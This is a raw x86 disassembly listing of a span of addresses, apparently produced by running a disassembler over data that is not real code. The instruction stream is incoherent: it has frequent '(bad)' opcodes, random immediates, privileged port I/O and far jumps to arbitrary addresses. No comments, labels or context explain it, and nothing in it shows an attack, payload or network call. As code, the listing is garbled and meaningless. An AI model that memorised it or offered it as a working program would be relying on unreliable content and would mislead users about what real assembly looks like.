  494e8b:	inc    DWORD PTR [eax]
  494e8d:	lods   al,BYTE PTR ds:[esi]
  494e8e:	stos   BYTE PTR es:[edi],al
  494e8f:	adc    BYTE PTR [edi+0x330680cc],dh
  494e95:	fbstp  TBYTE PTR [edi+0x6288545d]
  494e9b:	pop    edi
  494e9c:	pop    edi
  494e9d:	inc    eax
  494e9e:	setg   BYTE PTR [eax-0x61]
  494ea2:	retf   
  494ea3:	xchg   esi,eax
  494ea4:	mov    ebp,ss
  494ea6:	and    BYTE PTR [edi-0x48],dl
  494ea9:	fs xchg esi,eax
  494eab:	sub    ch,BYTE PTR [edi-0x31]
  494eae:	cmp    BYTE PTR [ebx],dh
  494eb0:	adc    BYTE PTR [ecx+0x355f1b6e],ch
  494eb6:	adc    edx,edi
  494eb8:	fmulp  st(2),st
  494eba:	mov    edi,0x844f428b
  494ebf:	adc    eax,0x57a32e50
  494ec4:	cmp    al,BYTE PTR [ecx]
  494ec6:	bound  esp,QWORD PTR [edi]
  494ec8:	push   ebx
  494ec9:	fild   QWORD PTR [edx-0x5a]
  494ecc:	es in  al,0x41
  494ecf:	xor    eax,0x2c18b8af
  494ed4:	gs xor eax,0x820c42af
  494eda:	push   es
  494edb:	add    eax,0x8a825797
  494ee0:	xchg   edx,eax
  494ee1:	push   esi
  494ee2:	test   eax,0x7fd54297
  494ee8:	cmp    eax,DWORD PTR [eax+0x62]
  494eeb:	je     0x494efd
  494eed:	out    0xa1,eax
  494eef:	push   ebp
  494ef0:	adc    DWORD PTR [ebp-0x1],0xab18740f
  494ef7:	add    al,0xaf
  494ef9:	(bad)  
  494efa:	sbb    BYTE PTR ss:[eax],ch
  494efd:	arpl   di,bx
  494eff:	outs   dx,DWORD PTR ds:[esi]
  494f00:	(bad)  
  494f01:	mov    edx,0x6c87854c
  494f06:	popa   
  494f07:	adc    eax,0x96853f49
  494f0c:	xor    DWORD PTR [edx],ecx
  494f0e:	scas   eax,DWORD PTR es:[edi]
  494f0f:	outs   dx,DWORD PTR ds:[esi]
  494f10:	pusha  
  494f11:	inc    edi
  494f12:	or     al,0x58
  494f14:	fbstp  TBYTE PTR [esi]
  494f16:	das    
  494f17:	dec    edx
  494f18:	adc    ch,BYTE PTR [ebx]
  494f1a:	mov    ecx,0x8746ef30
  494f1f:	add    DWORD PTR ds:0x81516037,ecx
  494f25:	test   edx,edi
  494f27:	daa    
  494f28:	push   ebx
  494f29:	pusha  
  494f2a:	cmp    DWORD PTR [ebx],0xfa7b7ca
  494f30:	aaa    
  494f31:	push   eax
  494f32:	or     BYTE PTR [edx+0x25],ch
  494f35:	xchg   edi,eax
  494f36:	mov    al,0x22
  494f38:	and    al,0x88
  494f3a:	idiv   DWORD PTR [eax]
  494f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494f3d:	int    0x58
  494f3f:	pop    es
  494f40:	out    0x23,eax
  494f42:	aaa    
  494f43:	push   eax
  494f44:	inc    edx
  494f45:	jp     0x494f99
  494f47:	inc    edi
  494f48:	xor    esp,DWORD PTR [eax+0x15]
  494f4b:	push   es
  494f4c:	adc    al,0x5f
  494f4e:	pop    ebx
  494f4f:	pop    eax
  494f50:	and    ecx,DWORD PTR [ecx-0x2db8b0ab]
  494f56:	add    ch,BYTE PTR [ebp-0x3a40b8e8]
  494f5c:	add    BYTE PTR [ebx-0x3b],ah
  494f5f:	das    
  494f60:	call   DWORD PTR [eax+0xfa038dc]
  494f66:	and    eax,ebp
  494f68:	test   DWORD PTR [ecx+0x3342fab],esi
  494f6e:	pop    ss
  494f6f:	and    al,0x7
  494f71:	ss int3 
  494f73:	cmp    dh,al
  494f75:	cmp    BYTE PTR [edx+0xe],cl
  494f78:	or     DWORD PTR [ecx],esp
  494f7a:	out    0x45,al
  494f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  494f7d:	lea    eax,[esi]
  494f7f:	fimul  WORD PTR [edi]
  494f81:	cmovb  ecx,edx
  494f84:	cmp    BYTE PTR [eax],bl
  494f86:	div    DWORD PTR [edi+eax*8]
  494f89:	and    al,cl
  494f8b:	mov    eax,ds:0x75af4181
  494f90:	adc    eax,0xffffffed
  494f93:	add    edx,edi
  494f95:	inc    ecx
  494f96:	pop    ss
  494f97:	or     ah,BYTE PTR [ebp+0xf672075]
  494f9d:	test   eax,0xffc6018b
  494fa2:	inc    edx
  494fa3:	dec    ebx
  494fa4:	mov    DWORD PTR [eax+ebx*4-0x71],esp
  494fa8:	xor    ah,dl
  494faa:	inc    edx
  494fab:	lods   al,BYTE PTR ds:[esi]
  494fac:	or     bl,BYTE PTR [edi+0x54f201d7]
  494fb2:	sub    al,0x23
  494fb4:	inc    edi
  494fb5:	cmp    BYTE PTR [eax],al
  494fb7:	xor    esi,DWORD PTR [esi+0x47801356]
  494fbd:	push   edx
  494fbe:	inc    ecx
  494fbf:	jmp    0x9e8cf731
  494fc4:	inc    ebx
  494fc5:	nop
  494fc6:	and    dl,BYTE PTR ds:[ebx]
  494fc9:	xor    cl,BYTE PTR [edi-0x6c]
  494fcc:	outs   dx,BYTE PTR ds:[esi]
  494fcd:	stos   DWORD PTR es:[edi],eax
  494fce:	leave  
  494fcf:	pop    es
  494fd0:	aas    
  494fd1:	inc    esp
  494fd2:	or     eax,eax
  494fd4:	dec    ebx
  494fd5:	adc    al,0xc7
  494fd7:	out    0x0,eax
  494fd9:	test   BYTE PTR [ebp+0x76faf74],dh
  494fdf:	xor    eax,0x377feada
  494fe4:	xlat   BYTE PTR ds:[ebx]
  494fe5:	jecxz  0x494f71
  494fe7:	and    eax,0xd0436769
  494fec:	inc    eax
  494fed:	call   0x515b:0xac039f6d
  494ff4:	scas   eax,DWORD PTR es:[edi]
  494ff5:	data16 (bad) 
  494ff8:	data16 ins BYTE PTR es:[edi],dx
  494ffa:	pop    eax
  494ffb:	mov    edi,0x1b47aa6f
  495000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495001:	sub    dh,bh
  495003:	sbb    ah,BYTE PTR [edi+0x36]
  495006:	aad    0xe
  495008:	stos   DWORD PTR es:[edi],eax
  495009:	and    eax,0x86072f2b
  49500e:	xor    eax,0x27c7c083
  495013:	jl     0x495038
  495015:	sub    BYTE PTR [edi+ebp*8+0x42320030],al
  49501c:	adc    eax,0x8ea79584
  495021:	je     0x495035
  495023:	or     eax,DWORD PTR [edi]
  495025:	dec    edi
  495026:	out    dx,eax
  495027:	fisubr DWORD PTR [esi+0x4183091e]
  49502d:	aaa    
  49502e:	out    0x28,eax
  495030:	sub    al,0x10
  495032:	adc    al,0x6f
  495034:	or     eax,0xbf1701cb
  495039:	inc    esi
  49503a:	(bad)  
  49503b:	daa    
  49503c:	push   ss
  49503d:	sbb    ebx,DWORD PTR [eax-0x71]
  495040:	lahf   
  495041:	test   DWORD PTR [ecx+edx*1],esi
  495044:	pop    ss
  495045:	aaa    
  495046:	fild   QWORD PTR [ebx]
  495048:	les    esp,FWORD PTR [edx]
  49504a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49504b:	pop    edi
  49504c:	pop    edi
  49504d:	cs push eax
  49504f:	or     BYTE PTR ds:0xdb227777,dl
  495055:	push   esi
  495056:	(bad)  
  495057:	dec    edi
  495058:	idiv   DWORD PTR [edi]
  49505a:	or     BYTE PTR [esi+0x35],dl
  49505d:	fiadd  DWORD PTR [esi+0x2fdf3777]
  495063:	scas   al,BYTE PTR es:[edi]
  495064:	call   0xd636:0x27347fd6
  49506b:	(bad)  
  49506c:	inc    eax
  49506d:	sub    al,0xb7
  49506f:	pop    edi
  495070:	stos   BYTE PTR es:[edi],al
  495071:	mov    WORD PTR [ebp-0x5e],es
  495074:	xlat   BYTE PTR ds:[ebx]
  495075:	aas    
  495076:	mov    bl,0xa0
  495078:	pop    ebp
  495079:	ret    0x7af
  49507c:	sbb    dh,BYTE PTR [edx+edi*1]
  49507f:	push   esi
  495080:	xchg   edi,ecx
  495082:	popa   
  495083:	mov    BYTE PTR [eax-0x3b],al
  495086:	mov    bh,0x2a
  495088:	sub    bh,BYTE PTR [edx+0x379f409a]
  49508e:	xlat   BYTE PTR ds:[ebx]
  49508f:	xor    cl,BYTE PTR [esi]
  495091:	xor    al,0xc0
  495093:	ss mov bl,0x41
  495096:	das    
  495097:	dec    ebx
  495098:	or     eax,0xa60b1b57
  49509d:	mov    dl,BYTE PTR [eax+ecx*2-0x29]
  4950a1:	scas   eax,DWORD PTR es:[edi]
  4950a2:	inc    esi
  4950a3:	inc    eax
  4950a4:	and    DWORD PTR [ebp-0x70],ebx
  4950a7:	iret   
  4950a8:	pop    es
  4950a9:	nop
  4950aa:	scas   eax,DWORD PTR es:[edi]
  4950ab:	cwde   
  4950ac:	lahf   
  4950ad:	inc    ebx
  4950ae:	add    BYTE PTR [eax],dh
  4950b0:	inc    esi
  4950b1:	add    BYTE PTR [ebx+0x1],ch
  4950b4:	jns    0x495046
  4950b6:	inc    esi
  4950b7:	xor    al,0x0
  4950b9:	inc    esi
  4950ba:	iret   
  4950bb:	xor    BYTE PTR [ecx+0x48],al
  4950be:	sbb    BYTE PTR [edi],bl
  4950c0:	inc    edx
  4950c1:	push   esi
  4950c2:	add    eax,0x2f6f0422
  4950c7:	push   es
  4950c8:	adc    esi,DWORD PTR [ebp+0x505fbfaa]
  4950ce:	mov    ah,0xc3
  4950d0:	adc    al,BYTE PTR [ebx-0x51]
  4950d3:	pop    eax
  4950d4:	add    DWORD PTR [edx+eax*4+0xe129707],ebp
  4950db:	mov    eax,ds:0x24baaf80
  4950e0:	sbb    BYTE PTR [ecx+0x4cc1b7c0],ah
  4950e6:	push   0xffffffc1
  4950e8:	(bad)  
  4950e9:	scas   eax,DWORD PTR es:[edi]
  4950ea:	sub    edx,DWORD PTR [esi+edx*2]
  4950ed:	arpl   WORD PTR [edi-0x52fbc561],si
  4950f3:	inc    edx
  4950f4:	xlat   BYTE PTR ds:[ebx]
  4950f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4950f6:	mov    edx,0x5bc27a77
  4950fb:	sub    cl,BYTE PTR [edi]
  4950fd:	shl    BYTE PTR ss:[ebp-0x5d20e7d6],1
  495104:	push   esi
  495105:	sub    BYTE PTR [ebx+eax*1],dh
  495108:	pop    ds
  495109:	mov    ebx,0x1255c989
  49510e:	scas   eax,DWORD PTR es:[edi]
  49510f:	ss dec edx
  495111:	sub    eax,DWORD PTR [edx-0x5b]
  495114:	daa    
  495115:	mov    ebx,0x35a49894
  49511a:	test   DWORD PTR [edi+0x61],0xd7f480e2
  495121:	dec    edi
  495122:	inc    edx
  495123:	and    al,BYTE PTR [edx+0x575761d6]
  495129:	imul   edx,DWORD PTR [eax+0x9],0x50
  49512d:	(bad)  
  49512e:	and    eax,0x4f645b13
  495133:	dec    edi
  495134:	inc    ebx
  495135:	mov    BYTE PTR [ebp+0x6b],dl
  495138:	ret    
  495139:	xor    DWORD PTR [edi],esp
  49513b:	das    
  49513c:	sbb    BYTE PTR [eax+esi*1-0xf],cl
  495140:	push   ebx
  495141:	mov    ecx,cr4
  495144:	aaa    
  495145:	sub    bh,0x31
  495148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495149:	in     al,0x9a
  49514b:	pusha  
  49514c:	aas    
  49514d:	inc    ebp
  49514e:	call   0x974ac1d3
  495153:	pop    es
  495154:	lea    edx,ds:0xc37c01b
  49515a:	ret    0x142a
  49515d:	xchg   DWORD PTR [edi-0x54],ebp
  495160:	enter  0x1600,0x2f
  495164:	lods   al,BYTE PTR ds:[esi]
  495165:	add    eax,0xa4f0595
  49516a:	inc    esi
  49516b:	lea    eax,[ecx-0x39]
  49516e:	aas    
  49516f:	lahf   
  495170:	test   DWORD PTR [esi+0x5c],ebp
  495173:	pop    edx
  495174:	aas    
  495175:	outs   dx,BYTE PTR ds:[esi]
  495176:	aas    
  495177:	add    ch,BYTE PTR [esi]
  495179:	test   al,0x4c
  49517b:	addr16 inc esi
  49517d:	xor    DWORD PTR [ecx-0x3e],ecx
  495180:	stos   BYTE PTR es:[edi],al
  495181:	das    
  495182:	pop    ds
  495183:	sub    eax,0x17485a06
  495188:	mov    ebp,0x87240715
  49518d:	jnp    0x49510f
  49518f:	push   edx
  495190:	and    eax,0x1463cf0c
  495195:	mov    BYTE PTR [ebp+0x358c8747],cl
  49519b:	cmp    eax,0x94af3f02
  4951a0:	push   esi
  4951a1:	inc    ecx
  4951a2:	imul   edi,DWORD PTR [esi-0x49],0x14
  4951a6:	cmp    al,0x11
  4951a8:	jmp    0xea0e:0x218fc657
  4951af:	and    DWORD PTR [ebx+0x3f],esi
  4951b2:	xor    DWORD PTR [ebp-0x1050a6cf],0x8b02ac28
  4951bc:	addr16 dec edi
  4951be:	test   eax,0x87914b52
  4951c3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4951c5:	or     ecx,edi
  4951c7:	and    eax,0x84364741
  4951cc:	push   esi
  4951cd:	and    al,0x8
  4951cf:	dec    edi
  4951d0:	xchg   edx,eax
  4951d1:	dec    esi
  4951d2:	stos   DWORD PTR es:[edi],eax
  4951d3:	dec    ecx
  4951d4:	das    
  4951d5:	(bad)  
  4951d6:	xor    DWORD PTR [ecx+0x4],ecx
  4951d9:	ret    0xebb0
  4951dc:	test   eax,0xc7b84842
  4951e1:	inc    ecx
  4951e2:	ja     0x495184
  4951e4:	outs   dx,BYTE PTR ds:[esi]
  4951e5:	ins    BYTE PTR es:[edi],dx
  4951e6:	or     eax,0x986d7ff
  4951eb:	adc    BYTE PTR cs:[ebx+0x1e403757],ch
  4951f2:	pop    ebx
  4951f3:	jo     0x49525c
  4951f5:	mov    bh,0x30
  4951f7:	push   es
  4951f8:	jno    0x495246
  4951fa:	xchg   esp,eax
  4951fb:	pop    ss
  4951fc:	inc    edx
  4951fd:	dec    edi
  4951fe:	rol    BYTE PTR [esi],cl
  495200:	add    eax,0xc5eb273a
  495205:	push   0x60
  495207:	or     eax,0x426667b7
  49520c:	test   al,0xb0
  49520e:	mov    WORD PTR [edi],gs
  495210:	cdq    
  495211:	pop    eax
  495212:	adc    BYTE PTR [ebx+0x14988a77],dl
  495218:	jbe    0x4951d5
  49521a:	ja     0x49526a
  49521c:	push   ecx
  49521d:	pop    ss
  49521e:	in     al,dx
  49521f:	xor    al,0x47
  495221:	inc    edx
  495222:	xchg   edi,eax
  495223:	add    BYTE PTR [ebx],bl
  495225:	inc    ecx
  495226:	and    al,0xd3
  495228:	push   esi
  495229:	xor    BYTE PTR [ebp-0x57],bl
  49522c:	out    0x2f,eax
  49522e:	xor    al,0x27
  495230:	sub    BYTE PTR [ebx-0x14],0x2
  495234:	pop    ds
  495235:	adc    eax,DWORD PTR [edi+0x27581855]
  49523b:	lahf   
  49523c:	sbb    esp,DWORD PTR ds:0x2fb4c9b8
  495242:	inc    ebx
  495243:	or     edx,DWORD PTR [eax+0x40]
  495246:	fmul   QWORD PTR [edx]
  495248:	dec    edi
  495249:	adc    dh,BYTE PTR [edi]
  49524b:	add    BYTE PTR [ebx-0x5c],ah
  49524e:	mov    al,ds:0xc24d8a5f
  495253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495254:	(bad)  
  495255:	and    ebp,edi
  495257:	pop    ebx
  495258:	mov    ch,0x88
  49525a:	shl    BYTE PTR [edi],1
  49525c:	sbb    eax,DWORD PTR [edi+0x3c]
  49525f:	or     DWORD PTR ds:0x7fb3fdb,0x6f
  495266:	sub    BYTE PTR [eax+0x7fcb2576],dh
  49526c:	fbld   TBYTE PTR [edx]
  49526e:	push   esp
  49526f:	mov    edi,DWORD PTR [eax+0xc06ef37]
  495275:	test   al,0x5
  495277:	pop    es
  495278:	mov    edi,0xe4691c11
  49527d:	ss inc ebp
  49527f:	pop    ebx
  495280:	das    
  495281:	mov    dh,0x9
  495283:	pop    edx
  495284:	enter  0x8f43,0x3f
  495288:	pop    ecx
  495289:	pop    edi
  49528a:	cmp    edx,DWORD PTR [ebp+0x2ba57bc7]
  495290:	sbb    eax,0xc71fcfa1
  495295:	or     BYTE PTR [edx+ecx*1+0x56ff3720],dh
  49529c:	mov    WORD PTR [eax],fs
  49529e:	mov    al,0xf7
  4952a0:	sub    dl,al
  4952a2:	aad    0x37
  4952a4:	scas   eax,DWORD PTR es:[edi]
  4952a5:	aas    
  4952a6:	mov    edi,0x60038c9a
  4952ab:	xor    eax,0xc4cddf93
  4952b0:	or     dh,BYTE PTR [ecx-0x4f4a6429]
  4952b6:	mov    edx,0x3ac317a5
  4952bb:	(bad)  
  4952bc:	stos   BYTE PTR es:[edi],al
  4952bd:	sar    BYTE PTR [edi-0x65],1
  4952c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4952c1:	test   BYTE PTR [ebp+ebx*4-0x1],cl
  4952c5:	xor    eax,edx
  4952c7:	les    eax,FWORD PTR [edx+0x620777c5]
  4952cd:	imul   esi,DWORD PTR [edx],0x34
  4952d0:	(bad)  
  4952d1:	cmp    DWORD PTR [edi],edx
  4952d3:	imul   esp,DWORD PTR [edi],0x87cfc116
  4952d9:	fwait
  4952da:	ror    BYTE PTR [edx],0x36
  4952dd:	call   edi
  4952df:	adc    al,0x1c
  4952e1:	adc    ah,BYTE PTR [edi+edi*4+0x5ac7fe8f]
  4952e8:	mov    eax,ds:0xcf5f6d84
  4952ed:	sbb    ch,BYTE PTR [ebx-0x77]
  4952f0:	xchg   edx,eax
  4952f1:	(bad)  
  4952f3:	jns    0x495315
  4952f5:	loopne 0x4952a4
  4952f7:	mov    edi,0x2630af83
  4952fc:	pop    ss
  4952fd:	pop    esp
  4952fe:	or     cl,BYTE PTR [esi+0x16ac4227]
  495304:	fcom   QWORD PTR [eax]
  495306:	xchg   edi,eax
  495307:	pop    edx
  495308:	dec    esp
  495309:	mov    eax,ds:0x67e76556
  49530e:	ss stos BYTE PTR es:[edi],al
  495310:	adc    al,0x1a
  495312:	mov    ch,0xf
  495314:	jg     0x49530e
  495316:	pop    edx
  495317:	mov    esi,es
  495319:	aaa    
  49531a:	dec    edi
  49531b:	sbb    al,0x10
  49531d:	lods   al,BYTE PTR ds:[esi]
  49531e:	or     ecx,DWORD PTR [edi+0x2eb13827]
  495324:	push   0xbb676f74
  495329:	test   eax,0x394f86ab
  49532e:	addr16 mov al,ds:0x9d5
  495332:	sbb    ebp,DWORD PTR [edi]
  495334:	push   es
  495335:	pusha  
  495336:	xlat   BYTE PTR ds:[ebx]
  495337:	or     dh,BYTE PTR [edi]
  495339:	pop    es
  49533a:	scas   eax,DWORD PTR es:[edi]
  49533b:	sub    DWORD PTR [edx+ebp*8],esi
  49533e:	mov    al,0x86
  495340:	ja     0x495384
  495342:	push   eax
  495343:	fimul  DWORD PTR [eax-0x15]
  495346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495347:	mov    ah,0xa8
  495349:	ins    BYTE PTR es:[edi],dx
  49534a:	sub    al,0x97
  49534c:	add    edx,DWORD PTR [esi]
  49534e:	xchg   esp,eax
  49534f:	add    al,0x37
  495351:	iret   
  495352:	mov    al,BYTE PTR [edx+0x2e2b60ce]
  495358:	fisub  DWORD PTR [ebp-0x591077bd]
  49535e:	xlat   BYTE PTR ds:[ebx]
  49535f:	sbb    ebp,DWORD PTR [ebx-0x2b60ec92]
  495365:	inc    esp
  495366:	pusha  
  495367:	jne    0x495390
  495369:	pop    ds
  49536a:	mov    ds:0xc7a59306,al
  49536f:	imul   ebp,DWORD PTR [eax+0x1b],0x9ed7df1c
  495376:	push   esi
  495377:	lds    ecx,FWORD PTR [edx]
  495379:	pop    es
  49537a:	fild   WORD PTR [ebx+0x156061c5]
  495380:	jg     0x4953e9
  495382:	mov    eax,ds:0x47224945
  495387:	mov    WORD PTR [esi+0x43],gs
  49538a:	fisub  DWORD PTR [edi+0x7468c6f]
  495390:	add    bh,ah
  495392:	xor    dh,BYTE PTR [eax+0x27311a9b]
  495398:	fild   QWORD PTR [edi+eax*2]
  49539b:	adc    al,0x84
  49539d:	mov    bh,0x43
  49539f:	imul   esp,DWORD PTR [eax+ebp*1],0x515adf25
  4953a6:	push   edx
  4953a7:	cmp    ebx,DWORD PTR [edi]
  4953a9:	aas    
  4953aa:	stos   DWORD PTR es:[edi],eax
  4953ab:	adc    al,0x36
  4953ad:	dec    edx
  4953ae:	scas   eax,DWORD PTR es:[edi]
  4953af:	aaa    
  4953b0:	fmul   DWORD PTR fs:[edx+0x43f71740]
  4953b7:	xchg   esp,eax
  4953b8:	push   esi
  4953b9:	pusha  
  4953ba:	mov    cl,0x4f
  4953bc:	pop    es
  4953bd:	sbb    al,dl
  4953bf:	stos   BYTE PTR es:[edi],al
  4953c0:	inc    ecx
  4953c1:	lahf   
  4953c2:	mov    ds:0x57a61830,al
  4953c7:	xor    al,0xdf
  4953c9:	(bad)  
  4953ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4953cb:	and    ebp,DWORD PTR [edi+edx*4]
  4953ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4953cf:	inc    edi
  4953d0:	inc    esp
  4953d1:	mov    al,0x10
  4953d3:	sbb    ch,BYTE PTR [edi-0x1]
  4953d6:	mov    WORD PTR [esi-0x2f],fs
  4953d9:	sbb    BYTE PTR [edi+0x4931c68],ch
  4953df:	mov    bh,0x35
  4953e1:	pusha  
  4953e2:	adc    BYTE PTR [eax],dl
  4953e4:	sub    cl,BYTE PTR [edi]
  4953e6:	xlat   BYTE PTR ds:[ebx]
  4953e7:	cmp    BYTE PTR [eax],ah
  4953e9:	xor    BYTE PTR [ecx+0x2840435f],dh
  4953ef:	dec    esi
  4953f0:	inc    edx
  4953f1:	inc    edi
  4953f2:	inc    ecx
  4953f3:	dec    eax
  4953f4:	add    bl,ah
  4953f6:	pop    edi
  4953f7:	dec    edi
  4953f8:	stos   BYTE PTR es:[edi],al
  4953f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4953fa:	xor    DWORD PTR [eax+0x3a073407],esi
  495400:	ins    BYTE PTR es:[edi],dx
  495401:	in     al,dx
  495402:	push   edx
  495403:	inc    edi
  495404:	aas    
  495405:	ficom  DWORD PTR [esi+0x20]
  495408:	fadd   st(6),st
  49540a:	fbstp  TBYTE PTR [ebx]
  49540c:	push   ebx
  49540d:	pop    edx
  49540e:	mov    ch,0xc3
  495410:	retf   
  495411:	aaa    
  495412:	pusha  
  495413:	push   0x7c7b083
  495418:	inc    eax
  495419:	loop   0x4953f3
  49541b:	sbb    al,BYTE PTR [edi-0x76d9ce39]
  495421:	add    DWORD PTR [eax-0x76f7ccb9],ebx
  495427:	xchg   esp,eax
  495428:	xor    al,0x1f
  49542a:	cmp    DWORD PTR [edi],ebp
  49542c:	mov    DWORD PTR [ebx],edx
  49542e:	cmp    al,al
  495430:	(bad)  
  495431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495432:	add    eax,0x37890a91
  495437:	out    0x47,eax
  495439:	push   ebp
  49543a:	ror    BYTE PTR [eax+0x857371c],0xc9
  495441:	pop    es
  495442:	sbb    BYTE PTR [esi+0x35],0xf1
  495446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495447:	and    eax,0xe74696c7
  49544c:	imul   edx,DWORD PTR [edi-0x55],0xffffffb6
  495450:	dec    edi
  495451:	sbb    ebx,DWORD PTR [edi+0x1a6a8102]
  495457:	ja     0x495409
  495459:	cs sub eax,0x20af5742
  49545f:	imul   edx,DWORD PTR ds:0xd13f20,0x175fd561
  495469:	or     dl,dh
  49546b:	and    eax,0x555fc768
  495470:	pop    eax
  495471:	sbb    eax,0x344b4fc4
  495476:	push   ecx
  495477:	fadd   DWORD PTR [edi+ebp*1+0x1e9361a7]
  49547e:	test   eax,0xb5b3672b
  495483:	stos   BYTE PTR es:[edi],al
  495484:	inc    eax
  495485:	lahf   
  495486:	(bad)  
  495487:	pushf  
  495488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495489:	(bad)  
  49548a:	push   esi
  49548b:	xchg   DWORD PTR [edi+0x48df4006],eax
  495491:	iret   
  495492:	out    dx,eax
  495493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495494:	shr    DWORD PTR ds:0x859d8f8c,0x15
  49549b:	xchg   DWORD PTR [edi+0x64340526],edx
  4954a1:	mov    bh,bh
  4954a3:	xor    eax,0xbc219a47
  4954a8:	ins    DWORD PTR es:[edi],dx
  4954a9:	jmp    FWORD PTR [ebx+0x77]
  4954ac:	inc    esp
  4954ad:	add    BYTE PTR [edx-0x4f],ch
  4954b0:	ret    0x2117
  4954b3:	xlat   BYTE PTR ds:[ebx]
  4954b4:	and    DWORD PTR [ecx],ebp
  4954b6:	lahf   
  4954b7:	ss push ecx
  4954b9:	or     dl,BYTE PTR [ebp+0x3100303c]
  4954bf:	push   ebp
  4954c0:	or     ebp,DWORD PTR [ebx]
  4954c2:	push   es
  4954c3:	xlat   BYTE PTR ds:[ebx]
  4954c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4954c5:	sub    al,0x28
  4954c7:	xchg   esi,eax
  4954c8:	mov    eax,ds:0xa5018b77
  4954cd:	add    eax,0xc2ca475f
  4954d2:	mov    bh,0x85
  4954d4:	xlat   BYTE PTR ds:[ebx]
  4954d5:	rol    DWORD PTR [eax],0xb
  4954d8:	test   eax,0xd2c20fb7
  4954dd:	push   es
  4954de:	imul   esp,edi,0x17
  4954e1:	add    edx,0x36b74f82
  4954e7:	ror    BYTE PTR [ecx+0x62],cl
  4954ea:	and    eax,0xd61e9c7
  4954ef:	push   es
  4954f0:	scas   eax,DWORD PTR es:[edi]
  4954f1:	mov    ds:0xadc25971,eax
  4954f6:	das    
  4954f7:	mov    ch,BYTE PTR [edi-0x14]
  4954fa:	cmp    BYTE PTR [ecx+0x30],dh
  4954fd:	xor    dl,BYTE PTR [edi+0x713f37b3]
  495503:	loop   0x4954c6
  495505:	sbb    bl,bl
  495507:	repz push edx
  495509:	fwait
  49550a:	sub    DWORD PTR [ebx+0x5d707793],ecx
  495510:	and    esi,DWORD PTR [ecx+0x5738bf97]
  495516:	lods   al,BYTE PTR ds:[esi]
  495517:	push   edx
  495518:	xchg   DWORD PTR [esi-0x4a],ebp
  49551b:	fist   WORD PTR [edx+0x68931221]
  495521:	iret   
  495522:	dec    edi
  495523:	and    DWORD PTR [ebx+0x43675a13],0x1826a0df
  49552d:	lahf   
  49552e:	inc    esp
  49552f:	imul   ecx,DWORD PTR [edx],0x2b
  495532:	cmp    DWORD PTR [edx-0x69],esp
  495535:	xor    ebx,DWORD PTR [edx]
  495537:	mov    esi,DWORD PTR [ecx+0x5f8777ad]
  49553d:	and    al,0x20
  49553f:	push   ecx
  495540:	or     BYTE PTR [edi],bl
  495542:	push   0xbff128b4
  495547:	jmp    esi
  495549:	mov    eax,0x6feda2d2
  49554e:	aaa    
  49554f:	push   ebx
  495550:	add    ecx,0xffffffaa
  495553:	adc    DWORD PTR [edx],esp
  495555:	addr16 mov bh,0x47
  495558:	and    BYTE PTR [ebp-0x27],dh
  49555b:	ret    0x5197
  49555e:	test   eax,0x31b74ae5
  495563:	daa    
  495564:	add    eax,DWORD PTR [ecx+ecx*4]
  495567:	and    BYTE PTR [edi+0x4f],dl
  49556a:	inc    esp
  49556b:	inc    eax
  49556c:	or     DWORD PTR [esi],eax
  49556e:	add    bl,BYTE PTR [edi]
  495570:	adc    BYTE PTR [ecx+0x51],ah
  495573:	inc    esp
  495574:	push   edi
  495575:	aaa    
  495576:	rol    DWORD PTR [ecx+0x0],1
  495579:	push   0x8dcb469f
  49557e:	inc    ebp
  49557f:	add    al,0x62
  495581:	pop    es
  495582:	push   es
  495583:	(bad)  
  495584:	and    eax,0x8197dee1
  495589:	dec    edx
  49558a:	add    al,0x23
  49558c:	(bad)  
  49558d:	das    
  49558e:	aad    0x26
  495590:	push   0x7307ff71
  495595:	shr    BYTE PTR [ebx-0x45],0xc2
  495599:	jnp    0x49555a
  49559b:	mov    dh,0xac
  49559d:	cs sbb edx,edi
  4955a0:	ja     0x495561
  4955a2:	stos   BYTE PTR es:[edi],al
  4955a3:	adc    al,0x37
  4955a5:	and    BYTE PTR [edi],dh
  4955a7:	xchg   edi,eax
  4955a8:	push   ebp
  4955a9:	inc    eax
  4955aa:	push   ebx
  4955ab:	test   eax,0x282d19ff
  4955b0:	test   BYTE PTR [edi+0x37],cl
  4955b3:	sub    esi,DWORD PTR ds:0x77a2c45a
  4955b9:	xchg   ecx,eax
  4955ba:	imul   eax,eax,0x69b9f68
  4955c0:	inc    edx
  4955c1:	jb     0x4955c4
  4955c3:	(bad)  
  4955c4:	xor    bl,BYTE PTR [edx-0x2b]
  4955c7:	ret    0xafa2
  4955ca:	pop    ds
  4955cb:	push   0x37ad0710
  4955d0:	mov    cs,WORD PTR [edx]
  4955d2:	sbb    BYTE PTR [edx],ch
  4955d4:	aam    0x17
  4955d6:	pop    esi
  4955d7:	add    dh,0xad
  4955da:	add    ah,BYTE PTR [edi+0x6ac01ce]
  4955e0:	lods   eax,DWORD PTR ds:[esi]
  4955e1:	pop    edi
  4955e2:	aaa    
  4955e3:	pop    ebx
  4955e4:	xchg   BYTE PTR [edx-0x6d],al
  4955e7:	aas    
  4955e8:	fisubr DWORD PTR [ebp+0x2d]
  4955eb:	adc    BYTE PTR [edi+0x27],0xca
  4955ef:	ret    0x13e4
  4955f2:	fiadd  WORD PTR [edx-0x6f]
  4955f5:	mov    BYTE PTR [ebp-0x78e840eb],al
  4955fb:	add    al,0xd6
  4955fd:	inc    edx
  4955fe:	pop    es
  4955ff:	inc    edi
  495600:	arpl   WORD PTR [edi],dx
  495602:	push   esi
